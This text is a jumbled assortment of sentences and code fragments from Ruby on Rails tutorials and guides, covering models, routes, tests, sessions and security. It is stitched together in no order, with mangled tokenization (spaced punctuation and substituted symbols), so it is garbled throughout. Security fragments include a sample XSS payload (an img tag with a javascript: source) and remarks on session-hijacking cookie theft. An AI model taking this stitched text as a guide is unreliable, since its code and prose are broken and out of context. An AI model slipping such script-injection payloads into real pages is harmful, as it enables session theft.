In this section , we &apos;ll take the first step toward persistent sessions by generating a \ emph { remember token } appropriate for creating permanent cookies using the \ kode { cookies } method , together with a secure \ emph { remember digest } for authenticating those tokens .
&quot; # { first _ name ▖ first } ▖ # { last _ name } &quot;
We are now nearly in a position to understand this .
Now we are in a position to create microposts in the same way we created users in Section ~ \ ref { sec : a _ user _ tour } .
Thanks to running \ kode { rails new } in Section ~ \ ref { sec : the _ hello _ application } and \ kode { bundle install } in Section ~ \ ref { sec : bundler } , we already have an application we can run---but how ?
An easy way to ╼ provide this access is to change the engine &apos;s scoped `ApplicationController` to ╼ inherit from the main application &apos;s `ApplicationController` ▖
This hierarchy is illustrated in Figure ~ \ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } .
This will help you with the creation of new files and changes of old files in an ╼ interactive session .
# Force all access to the app over SSL , use Strict-Transport-Security ,
The other new idea is the \ kode { pluralize } text helper .
\ kode { f ▖ object } is \ kode { @ user } , and in
Create a random string of digits for use as a remember token .
Logging a user in is simple with the help of the \ kode { session } method defined by Rails .
# config ▖ mock _ with : flexmock
----------------------------
can be rewritten in a single line :
has _ many : orders , - &gt; { where processed : true }
module ActiveRecord
xml ▖ title ( @ feed _ title )
class Person &lt; ActiveRecord : : Base
$ bundle exec rake test ╼ 2 tests , 2 assertions , 0 failures , 0 errors , 0 skips
# # # `acceptance`
To get started , we first generate an integration test file for signing up users , which we &apos;ll call \ kode { users \ _ signup } ( adopting the controller convention of a plural resource name ) :
For example , if your application includes assemblies and parts , with each assembly having many parts and each part appearing in many assemblies , you could declare the models this way :
Because of that , `explain` actually ╼ executes the query , and then asks for the query plans ▖
The resulting \ kode { @ user } variable definition appears in Listing ~ \ ref { code : new _ action _ with _ user } .
Putting the embedded Ruby discussed above into the site layout leads to the code in Listing ~ \ ref { code : layout _ flash } .
\ href { http : / / www ▖ codeschool ▖ com / } { Code School } : Interactive programming courses
= &gt; ApplicationController
Rails : : Server ▖ new ▖ tap do &#124; server &#124;
xml ▖ title ( item _ title ( item ) )
Example
That &apos;s a gotcha , for example the root element of the list of contributors above would not be &quot; contributors &quot; if the collection was empty , but &quot; nil-classes &quot; ▖
This resourceful route :
If you now try signing up as a new user , you should be redirected as shown in Figure ~ \ ref { fig : redirected _ not _ activated } , and an email like the one shown in Listing ~ \ ref { code : account _ activation _ email } should be generated .
With these declarations , asking for the value of ` @ customer ▖ orders ▖ size` requires making a call to the database to perform a `COUNT ( * ) ` query ▖
We can then use this variable in any of the \ texttt { before } or \ texttt { it } blocks throughout the rest of the test ▖ One advantage of \ texttt { let } is that it \ emph { memoizes } its value , which means that it remembers the value from one invocation to the next .
default _ scope { where ( &quot; removed _ at IS NULL &quot; ) }
X # = &gt; : in _ M
The latter is responsible for creating ╼ the database structure , which is what we &apos;ll look at next .
Change the content of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } to read ``hola , mundo ! &apos; &apos; instead of ``hello , world ! &apos; &apos; .
won &apos;t be inserted into production applications or tests .
gets all of the current password tests to pass , and it does a lot more besides .
class : &quot; nav _ bar &quot; % &gt;
The result is the best of both worlds : convenience in development and efficiency in production .
# Let &apos;s define a module called &quot; M &quot; again .
I shall be late ! &quot; ▖ truncate _ words ( 3 , separator : &apos; ! &apos; )
Active Support adds `missing _ name ? ` to `NameError` , which tests whether the exception was raised because of the name passed as argument .
In December 2006 , 34,000 actual user names and passwords were stolen in a &#91; MySpace phishing attack &#93; ( http : / / news ▖ netcraft ▖ com / archives / 2006 / 10 / 27 / myspace _ accounts _ compromised _ by _ phishers ▖ html ) ▖
`assert _ generates` asserts that a particular set of options generate a particular path and can be used with default routes or custom routes ▖
The result appears in Listing ~ \ ref { code : db _ seed }
Most of the secure password machinery will be implemented using a single Rails method called \ kode { has \ _ secure \ _ password } , which we &apos;ll include in the User model as follows :
Though I &apos;ve worked my way through many Rails books , this is the one that finally made me ``get &apos; &apos; it .
umerate } ╼ ╼ % subsection finding _ and _ authenticating _ a _ user ( end ) ╼ ╼ \ subsection { Rendering with a flash message } % ( fold ) ╼ \ label { sec : rendering _ with _ a _ flash _ message } ╼ ╼
Finally , we want to show a link to the `edit` action in the list of all the ╼ articles , so let &apos;s add that now to `app / views / articles / index ▖ html ▖ erb` to make ╼ it appear next to the &quot; Show &quot; link :
# # # # hidden _ field _ tag
Security , especially in web applications , is a broad and detailed area ▖
Now we come to some steps that are necessary each time you create a new \ emph { repository } ( sometimes called a \ emph { repo } for short ) .
# # # Configuring Generators
╼ * &quot; THE BEER-WARE LICENSE &quot; ( Revision 42 ) :
In particular , we &apos;ll arrange for a user &apos;s microposts to be retrieved in a specific \ emph { order } , and we &apos;ll also make microposts \ emph { dependent } on users so that they will be automatically destroyed if their associated user is destroyed .
`pluralize` is a rails helper that takes a number and a string as its ╼ arguments ▖
Active Record also allows you to pass in hash conditions which can increase the readability of your conditions syntax ▖
use ActiveRecord : : ConnectionAdapters : : ConnectionManagement
* `config ▖ action _ mailer ▖ smtp _ settings` allows detailed configuration for the ` : smtp` delivery method ▖
in Listing ~ \ ref { code : hello _ action } and
If you want something ╼ different , encode your content and pass in the encoded content and encoding in a ╼ `Hash` to the `attachments` method .
&lt; option value = &quot; &quot; &gt; &lt; / option &gt;
Adding the Capybara DSL to the RSpec helper file .
For now , we &apos;re only interested ╼ in `app / models / article ▖ rb` and `db / migrate / 20140120191729 _ create _ articles ▖ rb` ╼ ( your name could be a bit different ) ▖
&lt; % = render @ users % &gt;
To take advantage of the upcoming style elements , we &apos;ll add some extra elements to ╼ the \ kode { home ▖ html ▖ erb } view ( Listing ~ \ ref { code : signup _ button } ) .
# # # Issue a Pull Request
Sharing the local server running on the cloud workspace .
You can specify unicode character routes directly ▖
\ chapter { Filling in the layout } % ( fold ) ╼ \ label { cha : filling _ in _ the _ layout } ╼ ╼ In the process of taking a brief tour of Ruby in Chapter ~ \ ref { cha : rails _ flavored _ ruby } , we learned about including the application stylesheet into the sample application ( Section ~ \ ref { sec : motivation } ) , but ( as noted in Section ~ \ ref { sec : css _ revisited } ) the stylesheet doesn &apos;t yet contain any CSS \ @ ▖ In this chapter , we &apos;ll start filling in the custom stylesheet by incorporating a CSS framework into our application , and then we &apos;ll add some custom styles of our own ▖ \ footnote {
To install Bootstrap , we run \ kode { bundle install } as usual :
The data model for password resets is similar to the one used for account activation ( Figure ~ \ ref { fig : user _ model _ account _ activation } ) .
Rails looks first in the application &apos;s ( `test / dummy` ) `app / views` directory and ╼ then in the engine &apos;s `app / views` directory ▖
{ &quot; development &quot; = &gt; { &quot; adapter &quot; = &gt; &quot; postgresql &quot; , &quot; host &quot; = &gt; &quot; localhost &quot; , &quot; database &quot; = &gt; &quot; my _ database &quot; , &quot; pool &quot; = &gt; 5 } }
WARNING : Do not simply replace `MultiJson ▖ dump` and `MultiJson ▖ load` with ╼ `JSON ▖ dump` and `JSON ▖ load` ▖
Guard monitors changes in the filesystem so that , for example , when we change the \ kode { static \ _ pages \ _ spec ▖ rb } file only those tests get run .
However , this does not filter all HTML , a few tags will be left ( by design ) , for example &amp; lt ; a &amp; gt ; :
If the second command fails , which sometimes happens on the cloud IDE for reasons I don &apos;t understand , try re-running the first \ kode { curl } command until the file downloads correctly .
Compounding the problem is the multiplicity of environments : different operating systems , version numbers , preferences in text editor and integrated development environment ( IDE ) , etc .
@ new _ assemblies = @ part ▖ assemblies ▖ where ( &quot; created _ at &gt; ? &quot; , 2 ▖ days ▖ ago )
Running \ kode { render @ users } automatically calls the \ kode { \ _ user ▖ html ▖ erb } partial on each user in the collection .
Remember , a `render : action` doesn &apos;t run any code in the target action , so nothing will set up the ` @ books` variable that the `index` view will probably require ▖
Micropost fixtures .
As you might suspect by now , the application code uses a before filter , this time to restrict access to the \ kode { destroy } action to admins .
Object-Relational Mapping , commonly referred to as its abbreviation ORM , is ╼ a technique that connects the rich objects of an application to tables in ╼ a relational database management system ▖
╼ x = x + 1
1234567890 ▖ to _ s ( : human _ size ) # = &gt; 1 ▖ 15 GB
Speaking of which , the test suite should still be \ passing :
In particular , we &apos;ll re-implement a couple of the RSpec integration tests in Cucumber to see how the two methods compare .
Finally , if you \ emph { do } end up using a third-party system later on , you &apos;ll be in a much better position to understand and modify it if you &apos;ve first built one yourself .
Asset directories
* `active _ record ▖ set _ configs` Sets up Active Record by using the settings in `config ▖ active _ record` by `send` &apos; ing the method names as setters to `ActiveRecord : : Base` and passing the values through .
By default , ╼ this means the files in `app / assets` take precedence , and will mask ╼ corresponding paths in `lib` and `vendor` .
# &lt; / hash &gt;
Choose meaningful examples that depict and cover the basics as well as interesting points or gotchas .
The other possibility , \ kode { collection } , works without the id , so that
as shown in Listing ~ \ ref { code : user _ index _ tests } .
In Chapter ~ \ ref { cha : user _ microposts } , the result was only a proto-feed ( Figure ~ \ ref { fig : home _ with _ proto _ feed _ 3rd _ edition } ) , but with the implementation in Listing ~ \ ref { code : from _ users _ followed _ by _ final } as seen in Figure ~ \ ref { fig : home _ page _ with _ feed } the Home page now shows the full feed .
Enjoy !
We accomplish this with the \ kode { hidden \ _ field \ _ tag } method in Listing ~ \ ref { code : follow _ form } , which produces HTML of the form
RESTful routes provided by the custom rules in resource in Listing ~ \ ref { code : following _ followers _ actions _ routes } .
* ` : status`
Ensuring that Rails throws errors on invalid mass assignment .
We associate to each user a remember token and a corresponding remember digest for use in persistent sessions .
# rspec-rails .
We &apos;ll take a quick detour in Chapter ~ \ ref { cha : rails _ flavored _ ruby } to learn a little about the Ruby language underlying Rails .
( You may see some extra things , like \ kode { ? body = 1 } , after the CSS filenames .
In this case , we can test the result of calling
will now run the four of them in turn .
Bootstrap CSS supports styling for four such flash classes ( \ kode { success } , \ kode { info } , \ kode { warning } , and \ kode { danger } ) , and we &apos;ll find occasion to use all of them in the course of developing the sample application .
rmdir &lt; directory &gt;
In addition , we &apos;ll include a raster of smaller user profile image links in the sidebar .
We can configure our production application to use SSL for secure communications and Puma for high performance .
1 ▖ month ▖ from _ now
# # # Separate Assets &amp; Precompiling
As discussed in more depth in Section ~ \ ref { sec : prerequisites } , web development is a challenging subject , especially for complete beginners .
# # # Parents
Finally , as a security precaution , we &apos;ll test for a length validation on passwords , requiring that they be at least six characters long :
The only way to explicitly not use the connection information in `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` is to specify an explicit URL connection using the ` &quot; url &quot; ` sub key :
More reading :
def authenticate ( controller , &amp; login _ procedure )
def rewrite _ path ( options )
╼ \ end { code } ╼ ╼ % subsection hashes _ and _ symbols ( end ) ╼ ╼ \ subsection { CSS revisited } % ( fold ) ╼ \ label { sec : css _ revisited } ╼ ╼
Please don &apos;t put &quot; feature request &quot; items into GitHub Issues ▖
# # # Sending Emails with Dynamic Delivery Options
SELECT * FROM clients LIMIT 5
&quot; 2010-07-27 23 : 42 : 00 &quot; ▖ to _ time ( : local ) # = &gt; Tue Jul 27 23 : 42 : 00 + 0200 2010
* `ActionDispatch : : Callbacks ▖ after` takes a block of code to run after the request .
Or , in English : &quot; return all articles that have a category and at least one comment &quot; ▖
$ bin / rails generate model Comment article _ id : integer text : text
( We &apos;ll see concrete examples of the magic columns starting in Section ~ \ ref { sec : creating _ user _ objects } ▖ )
This code returns a version of the \ kode { params } hash with only the permitted attributes ( while raising an error if the \ kode { : user } attribute is missing ) .
This option is best suited for ╼ one-liners .
# = &gt; &#91; &quot; cannot contain the characters !
CREATE TABLE products (
&lt; div id = &quot; error _ explanation &quot; &gt;
In the previous example the macro generates `avatar _ size` rather than `size` .
te } ╼ ╼ % section sass _ and _ the _ asset _ pipeline ( end ) ╼ ╼ \ section { Layout links } % ( fold ) ╼ \ label { sec : layout _ links } ╼ ╼ Now that we &apos;ve finished a site layout with decent styling , it &apos;s time to start filling in the links we &apos;ve stubbed out with \ kode { &apos; \ # &apos; } ▖
* ` _ product ▖ html ▖ erb`
If you choose to use MySQL and are using JRuby , your `config / database ▖ yml` will look a little different ▖
When you are defining an attribute in a class that is meant to be subclassed , name collisions are a risk ▖
# # # `errors ▖ size`
class CreateAssembliesAndParts &lt; ActiveRecord : : Migration
This section has placed rather heavy demands on your data modeling skills , and it &apos;s fine if it takes a while to soak in .
When we allow users to log in to the sample app starting in Chapter ~ \ ref { cha : sign _ up } , we will need to find the user record corresponding to the submitted email address .
CSS for the ``remember me &apos; &apos; checkbox .
Selecting Specific Fields
As with the \ kode { user \ _ id } , the \ kode { content } attribute must be present , and it is further constrained to be no longer than 140 characters , making it an honest \ emph { micro } post .
These examples don &apos;t do any harm so far , so let &apos;s see how an attacker can steal the user &apos;s cookie ( and thus hijack the user &apos;s session ) ▖
This works fine and , because they are actually \ emph { called } using \ kode { User ▖ new \ _ token } and \ kode { User ▖ digest } , it is probably the clearest way to define them .
# = &gt; # &lt; Client id : 1 , first _ name : &quot; Lifo &quot; &gt;
* `config ▖ action _ view ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class , which is then used to log information from Action View ▖
This means `Time ▖ now ▖ to _ date` may equal `Date ▖ yesterday` .
&#124; DELETE &#124; / comments / : id ( ▖ : format ) &#124; comments # destroy &#124; sekret _ comment _ path &#124;
as shown in Listing ~ \ ref { code : password _ reset _ form } .
The ` : debug` option is redundant if debug mode is already on .
Listing ~ \ ref { code : development _ email _ settings } uses a host name of \ kode { &apos; example ▖ com &apos; } , but you should use the actual host of your development environment .
The Micropost model needs only two attributes : a \ kode { content } attribute to hold the micropost &apos;s content and a \ kode { user \ _ id } to associate a micropost with a particular user .
Suppose you &apos;ve made some accidental changes , such as ( D &apos;oh ! ) deleting the critical \ kode { app / controllers / } directory :
The new method , `update` , is used when you want to update a record ╼ that already exists , and it accepts a hash containing the attributes ╼ that you want to update ▖
If you are using Windows , go to \ href { http : / / railsinstaller ▖ org / } { Rails Installer } and download the Rails Installer executable and view the excellent installation video .
When a controller or a scaffold is generated with the default Rails gemset , a ╼ CoffeeScript file and a SCSS file are generated in place of a regular JavaScript ╼ and CSS file ▖
In particular , \ kode { Rails ▖ env ▖ development ? } \ is \ kode { true } only in a development environment , so the Embedded Ruby
Open `app / controllers / articles _ controller ▖ rb` and change the `create` action to ╼ look like this :
The \ kode { edit } action for password reset .
# # # `select _ all`
# Instead of this
# # # # Joining Nested Associations ( Multiple Level )
Alice signs up for the sample app , with address alice @ wonderland ▖ com .
The signup form is now live , and the result of a successful signup is shown in Figure ~ \ ref { fig : signup _ in _ production } .
At this point , if you are using Git , you should merge your changes back into the master branch :
So , given :
belongs _ to : order
&lt; / tr &gt;
One test should fail .
# config / environments / test ▖ rb
The corresponding route helper would be `publisher _ magazine _ photo _ url` , requiring you to specify objects at all three levels ▖
By not writing the same information over and over ╼ again , our code is more maintainable , more extensible , and less buggy .
HTML colors can be coded with three pairs of base-16 ( hexadecimal ) numbers , one each for the primary colors red , green , and blue ( in that order ) .
We can replace this in Sass with
See the next section for ╼ information on compiling locally .
NoMethodError : undefined method `reverse &apos; for : foobar : Symbol
It &apos;s convenient to model sessions as a RESTful resource : visiting the login page will render a form for \ emph { new } sessions , logging in will \ emph { create } a session , and logging out will \ emph { destroy } it .
* Symbols .
# perform sophisticated change
You may note that , unlike the demo Users and Microposts controllers from Chapter ~ \ ref { cha : a _ toy _ app } , the Static Pages controller does not use the standard REST actions .
There are a few major changes related to JSON handling in Rails 4 ▖ 1 .
Note the leading underscore on the filename \ kode { \ _ shim ▖ html ▖ erb } ; this underscore is the universal convention for naming partials , and among other things makes it possible to identify all the partials in a directory at a glance .
With the test data thus prepared , the test itself is fairly straightforward : we visit the user profile page and check for the page title and the user &apos;s name , Gravatar , micropost count , and paginated microposts .
As you can see above the `default _ scope` is being merged in both ╼ `scope` and `where` conditions .
exist config
# # # # # Conditional Layouts
To set up your CDN you have to have your application running in production on ╼ the internet at a publically available URL , for example `example ▖ com` ▖
# # # # Limits to Nesting
Even though Active Record lets you specify conditions on the eager loaded associations just like `joins` , the recommended way is to use &#91; joins &#93; ( # joining-tables ) instead .
The method `beginning _ of _ minute` returns a timestamp at the beginning of the minute ( hh : mm : 00 ) :
We &apos;ll be using the factories generated by \ href { http : / / github ▖ com / thoughtbot / factory _ girl } { Factory Girl } , a Ruby gem produced by the good people at \ href { http : / / thoughtbot ▖ com / } { thoughtbot } .
* Controller-level validations can be tempting to use , but often become ╼ unwieldy and difficult to test and maintain ▖
Due to the way Active Record interprets parameters in combination with the way ╼ that Rack parses query parameters it was possible to issue unexpected database ╼ queries with `IS NULL` where clauses ▖
Ruby on Rails uses &#91; GitHub Issue Tracking &#93; ( https : / / github ▖ com / rails / rails / issues ) to track issues ( primarily bugs and contributions of new code ) ▖
The next key , ` : formats` specifies the ╼ format of template to be served in response ▖
In particular , it does \ emph { not } pull all the microposts out of the database and then call \ kode { length } on the resulting array , as this could become inefficient as the number of microposts grew .
There are many mostly equivalent possibilities---essentially , any long random string will do .
As mentioned above , it &apos;s also possible to abandon your topic branch \ linebreak changes , in this case with \ kode { git branch -D } :
render plain : params &#91; : article &#93; ▖ inspect
As in Section ~ \ ref { sec : layout _ link _ tests } , we &apos;ll use \ kode { assert \ _ select } to test HTML elements of the relevant pages , taking care to check only elements unlikely to change in the future .
require &apos; active _ support / core _ ext / object&apos;
This can lead to false redirection , XSS or HTTP response splitting .
While a busy production environment may overload SQLite , it works well for development and testing ▖
WARNING : Note that in that case `parent _ name` returns `nil` .
end _ of _ week ( at _ end _ of _ week )
customer _ name : &quot; John Doe &quot; )
# # = &gt; &lt; label for = &quot; article _ title &quot; &gt; A short title &lt; / label &gt;
Extensions to `Range`
No static pages ( such as ``Home &apos; &apos; or ``About &apos; &apos; )
orphan ▖ reachable ?
= &gt; &quot; The Dude &quot;
The initial index page for the Users resource ( \ href { http : / / localhost : 3000 / users } { / users } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ blank _ user _ index _ rails _ 3-full ▖ png } { ( full size ) }
Default scopes are no longer overridden by chained conditions .
With the code in Listing ~ \ ref { code : test _ helper _ sessions } , we can assert that the user is logged in after signup using the line shown in Listing ~ \ ref { code : login _ after _ signup _ test } .
A Bitbucket repository page .
Moreover , since we &apos;ll be using email addresses as unique usernames when users log in , we shouldn &apos;t allow email duplicates in the database .
* `config ▖ i18n ▖ default _ locale` sets the default locale of an application used for i18n ▖
* `before _ eager _ load` : This is run directly before eager loading occurs , which is the default behavior for the `production` environment and not for the `development` environment .
# delegates to the Rails constant
You may be able to guess the code for enforcing a \ kode { minimum } length constraint by referring to the corresponding \ kode { maximum } validation for the user &apos;s name ( Listing ~ \ ref { code : length _ validation } ) :
The association defined in Listing ~ \ ref { code : has _ many _ following _ through _ active _ relationships } leads to a powerful combination of Active Record and array-like behavior .
( As we &apos;ll see in detail starting in Chapter ~ \ ref { cha : modeling _ users } , this user data is stored in a database back-end ▖ )
# You can have the root of your site routed with &quot; root &quot;
# # # Other Security Considerations
As preparation for adding dynamic pages to our sample application , now is a good time to add some debug information to our site layout ( Listing ~ \ ref { code : rails _ debug } ) .
# # # `exclusion`
&lt; % = render partial : &quot; product &quot; , collection : @ products % &gt;
Here &apos;s a patched version of the method :
@ current _ user ▖ special ? ?
&lt; % @ articles ▖ each do &#124; article &#124; % &gt;
This method is also aliased as `getutc` .
We &apos;ll start with a basic version good enough for development use , and then add a series of enhancements to make image upload production-ready .
Then merge the changes back into the master branch using the same technique as in Section ~ \ ref { sec : git _ commands }
We &apos;ve come a long way in this chapter : installation , development environment setup , version control , and deployment .
# # # Naming Conventions
# # # # options _ from _ collection _ for _ select
# # # # atom _ feed
Having shown how to create , show , and edit users , we come finally to destroying them ( Figure ~ \ ref { fig : demo _ destroy _ user _ rails _ 3 } ) .
The other new method is \ kode { any ? } , which ( together with \ kode { empty ? } ) is one of a pair of complementary methods :
Recall from Listing ~ \ ref { code : hello _ root _ route } that we changed
They translate to calls to `since` or `advance` ▖
( Because of the email downcasing callback in Listing ~ \ ref { code : email _ downcase } , this will never make a difference in this tutorial , but it &apos;s a good practice in case the \ kode { gravatar \ _ for } ever gets used on email addresses from other sources ▖ )
* The basics of Ajax .
Now the demo application should be ready to go at \ href { http : / / localhost : 3000 / } { http : / / localhost : 3000 / } .
Additional layers of preprocessing can be requested by adding other extensions , ╼ where each extension is processed in a right-to-left manner ▖
* `update !
yield ( : news _ content ) : yield % &gt;
# # # Configuring Middleware
Math ▖ qualified _ const _ get ( &quot; E &quot; ) # = &gt; 2 ▖ 718281828459045
The `test` directory is where tests for the engine will go ▖
This will generate the following things :
The &quot; Welcome aboard &quot; page is the _ smoke test _ for a new Rails application : it ╼ makes sure that you have your software configured correctly enough to serve a ╼ page ▖
Since we &apos;re about to add the ability to create new users through the web , let &apos;s remove the user created at the console in Section ~ \ ref { sec : creating _ a _ user } .
Before we saw \ kode { split } convert a string to an array .
as shown in Listing ~ \ ref { code : edit _ tests _ signed _ in } .
This address tells the computer to listen on every available IP address configured on that specific machine ; in particular , we can view the application using the special address \ kode { 127 ▖ 0 ▖ 0 ▖ 1 } , which is also known as \ kode { localhost } .
In case you need a dummy Rails app to test changes , the `--dev` flag of `rails new` generates an application that uses your local branch :
The controller &apos;s ╼ class is defined within the `Blorgh` module :
Article ▖ includes ( : comments ) ▖ where ( comments : { visible : true } )
In the case of a user &apos;s microposts , we would have this :
These options take either a method name , or an array of method names , corresponding to method names within the controller :
end { enumerate } ╼ ╼ % subsection a _ class _ of _ our _ own ( end ) ╼ ╼ \ subsection { Modifying built-in classes } % ( fold ) ╼ \ label { sec : modifying _ built _ in _ classes } ╼ ╼
The subsequent code creates an empty example user and then fills in the name and email address by assigning directly to the corresponding attributes ( assignments made possible by the \ kode { attr \ _ accessor } line in Listing ~ \ ref { code : example _ user } ) .
To get started with static pages , we &apos;ll first generate a controller using the same Rails \ kode { generate } script we used in Chapter ~ \ ref { cha : a _ toy _ app } to generate scaffolding .
If you run into problems at Heroku , make sure to take a look at the production logs to try to diagnose the problem :
The updated versions are shown in Listing ~ \ ref { code : signup _ errors _ updated } , Listing ~ \ ref { code : password _ reset _ updated } , and Listing ~ \ ref { code : edit _ errors _ updated } .
# becomes
This terminology is wrong because by design encryption is \ emph { reversible } ---the ability to encrypt implies the ability to \ emph { decrypt } as well .
Another problem for the worm &apos;s author were CSRF security tokens ▖
The solution ( removing the fixture contents as in Listing ~ \ ref { code : empty _ fixtures } ) is also the same ( Listing ~ \ ref { code : empty _ relationship _ fixture } ) .
queue _ as : default
The Help page with HTML structure removed ▖
NOTE : Defined in `active _ support / core _ ext / hash / except ▖ rb` .
Examples of authentication and authorization systems include \ href { http : / / github ▖ com / thoughtbot / clearance } { Clearance } , \ href { http : / / github ▖ com / binarylogic / authlogic } { Authlogic } , \ href { http : / / github ▖ com / plataformatec / devise } { Devise } , and \ href { http : / / railscasts ▖ com / episodes / 192-authorization-with-cancan } { CanCan } ( as well as non-Rails-specific solutions built on top of \ href { http : / / en ▖ wikipedia ▖ org / wiki / OpenID } { OpenID } or \ href { http : / / en ▖ wikipedia ▖ org / wiki / Oauth } { OAuth } ) .
By outputting ` @ article ▖ author` using the ` &lt; % = ` tag , the `to _ s` method will be ╼ called on the object ▖
As a result of its use of \ kode { pluralize } , the code
Recall from the discussion in Section ~ \ ref { sec : account _ activation _ mailer } that the activation token and email are available as \ kode { params &#91; : id &#93; } and \ kode { params &#91; : email &#93; } , respectively .
i ▖ name = &apos; Jones&apos;
body i18n ▖ t : body , user _ name : user ▖ name
The resulting layout appears in Listing ~ \ ref { code : application _ layout } .
in Listing ~ \ ref { code : _ close _ browser } .
As the ` : host` usually is consistent across the application you can configure it ╼ globally in `config / application ▖ rb` :
You can use multiple lines if you need more space and you can attach code examples indented with 4 spaces ▖
&#124; GET &#124; / photos / : id &#124; photos # show &#124; image _ path ( : id ) &#124;
In this case , it &apos;s easy to write a short test for the User model , in which we use \ kode { following ? }
This cache is not thread safe and is intended only for serving as a temporary memory cache for a single thread .
errors ▖ add ( : discount , &quot; can &apos;t be greater than total value &quot; )
&lt; / html &gt;
The purpose of this section is to ╼ describe general caching behavior of most CDNs , your specific provider may ╼ behave slightly differently .
Extensions to `Class`
To \ emph { print } a string , the most commonly used Ruby function is \ kode { puts } ( pronounced ``put ess &apos; &apos; , for ``put string &apos; &apos; ) :
Also you can use them in any place that you want inside the routes , for example in a scope or namespace call :
Configuration Gotchas
The full set of methods that can be used in this block are as follows :
as shown in Listing ~ \ ref { code : bootstrap _ js } .
&lt; ul &gt; &lt; li &gt; ` : location` - The location of the sendmail executable ▖
TIP : In development mode ( which is what you &apos;re working in by default ) , Rails ╼ reloads your application with every browser request , so there &apos;s no need to stop ╼ and restart the web server when a change is made .
You can \ href { http : / / lmgtfy ▖ com / ? q = invalid + multibyte + character } { Google the error message } if you want to learn how to make it go away .
The \ kode { update \ _ attributes } method is an alias for the shorter \ kode { update } method , but I prefer the longer version because of its similarity to the singular version of the method , \ kode { update \ _ attribute } .
&lt; img src = javascript : alert ( &apos; Hello &apos; ) &gt;
( In fact , as we saw in Section ~ \ ref { sec : demo _ users _ resource } and Section ~ \ ref { sec : microposts _ resource } , \ texttt { rails generate } can make automatic edits to the \ texttt { routes ▖ rb } file , which we also want to undo automatically ▖ )
Each action &apos;s purpose is to collect information to provide ╼ it to a view .
* `active _ support ▖ initialize _ time _ zone` Sets the default time zone for the application based on the `config ▖ time _ zone` setting , which defaults to &quot; UTC &quot; .
As in Section ~ \ ref { sec : requiring _ signed _ in _ users } and Section ~ \ ref { sec : requiring _ the _ right _ user } , we &apos;ll enforce access control using a before filter , this time to restrict access to the \ kode { destroy } action to admins .
exist app / views / users
Turbolinks
( You might have to follow the \ href { http : / / help ▖ github ▖ com / key-setup-redirect } { GitHub tutorial on creating SSH keys } first ▖ )
A mockup of the user following page .
But what can go wrong ?
class Representative &lt; ActiveRecord : : Base
* * `ActionDispatch : : Flash` * *
If you have a question on how the Rails team handles certain API , don &apos;t hesitate to open a ticket or send a patch to the &#91; issue tracker &#93; ( https : / / github ▖ com / rails / rails / issues ) .
A stub view for showing user information .
╼ * = require _ tree .
The best way to be sure that your application still works after upgrading is to have good test coverage before you start the process ▖
If you prefer to learn everything systematically from the ground up , or if you have never programmed before , then learning Ruby first might work well for you , and in this case I recommend \ href { http : / / www ▖ amazon ▖ com / gp / product / 1430223634 } { \ emph { Beginning Ruby } } by Peter Cooper .
@ open _ order = @ open _ orders ▖ first # Now the database will be queried
User ▖ all ▖ each do &#124; user &#124;
The full application code appears in Listing ~ \ ref { code : settings _ link } ) .
# # # # Getting a Different Redirect Status Code
As with account activations ( Section ~ \ ref { sec : account _ activations _ resource } ) , our first step is to generate a controller for our new resource :
get &apos; / patients / : id &apos; , to : &apos; patients # show &apos; , as : &apos; patient&apos;
1234567 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Million &quot;
# Be sure to restart your server when you modify this file .
We see here that \ kode { pluralize } takes an integer argument and then returns the number with a properly pluralized version of its second argument .
As you saw above :
There are also two common ways to specify a gem version range , which allows us to exert some control over the version used by Rails .
The user profile with microposts ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) .
to check the right redirect target and
When you include the engine into an application later on , you will do so with ╼ this line in the Rails application &apos;s `Gemfile` :
╼ following
A test for the links on the layout ▖
# # # # `cattr _ reader` , `cattr _ writer` , and `cattr _ accessor`
\ href { http : / / peepcode ▖ com / } { PeepCode } : Excellent commercial screencasts
The result appears in Listing ~ \ ref { code : initial _ working _ feed }
&#124; GET &#124; / photos / : id / edit &#124; photos # edit &#124; edit _ image _ path ( : id ) &#124;
But this will _ not _ stop the rest of the code in the `show` action from running , and when Rails hits the end of the action , it will start to render the `regular _ show` view - and throw an error ▖
# # # Using a Symbol with ` : if` and ` : unless`
from Listing ~ \ ref { code : user _ logout _ test } to
To execute the code in Listing ~ \ ref { code : sample _ relationships } , we reseed the database as usual :
Sprockets will also look through the paths specified in `config ▖ assets ▖ paths` , ╼ which includes the standard application paths and any paths added by Rails ╼ engines .
is automatically converted to
╼ = &gt; 2
* `group`
A mockup of the signin form ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signin _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Adding Factory Girl to the \ kode { Gemfile } .
This requires the use of the \ kode { paginate } method , which we &apos;ll cover shortly .
As long as the version number is 1 ▖ 11 ▖ x or greater , installed gems will automatically be executed in the proper Bundler environment , so that you can write ( for example )
We can eliminate this duplication with a \ kode { before } block :
Upon encountering an error or failing test , the test runner shows a ``stack trace &apos; &apos; or ``backtrace &apos; &apos; that traces the course of a failed test through the application .
Active Record Basics
$ bundle exec rake test TEST = test / helpers / sessions _ helper _ test ▖ rb
# &lt; Client id : 219 , first _ name : &quot; James &quot; &gt; ,
We &apos;ll start by adding the required \ kode { remember \ _ digest } attribute to the User model , as shown in Figure ~ \ ref { fig : user _ model _ remember _ digest } .
in Listing ~ \ ref { code : generated _ user _ fixtures } .
With invalid information , the update attempt returns \ kode { false } , so the \ kode { else } branch renders the edit page .
Both webmail worms have the goal to harvest email addresses , something a criminal hacker could make money with .
By wrapping the \ kode { post } in the \ kode { assert \ _ no \ _ difference } method with the string argument \ kode { &apos; User ▖ count &apos; } , we arrange for a comparison between \ kode { User ▖ count } before and after the contents of the \ kode { assert \ _ no \ _ difference } block .
&lt; % = link _ to &quot; an article &quot; , @ article , remote : true % &gt;
You should get an error that looks like this :
Scopes
If we wish to remove scoping for any reason we can use the `unscoped` method ▖
&lt; strong &gt; Comment : &lt; / strong &gt;
What &apos;s Next ?
Job Execution
The point of the \ kode { home } action , as we saw in Chapter ~ \ ref { cha : static _ pages } , is to render a web page , not to return a value .
